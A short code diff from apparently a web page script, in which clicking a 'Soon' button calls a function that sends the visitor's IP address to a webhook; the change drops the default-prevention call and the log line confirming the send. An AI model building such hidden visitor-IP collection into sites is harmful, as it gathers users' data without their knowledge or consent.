@@ -36,11 +36,8 @@ window.onload = () => {
   if (soonButton) {  // Ensure button is found
     soonButton.addEventListener('click', async (event) => {
       // Prevent default button behavior
-      event.preventDefault();
-
       // Call the function to send the IP when the "Soon" button is clicked
-      await sendUserIPToWebhook();
-      console.log('IP sent to webhook'); // Verificar si la función se ejecuta correctamente
+      await sendUserIPToWebhook(); // Verificar si la función se ejecuta correctamente
     });
   }
 };
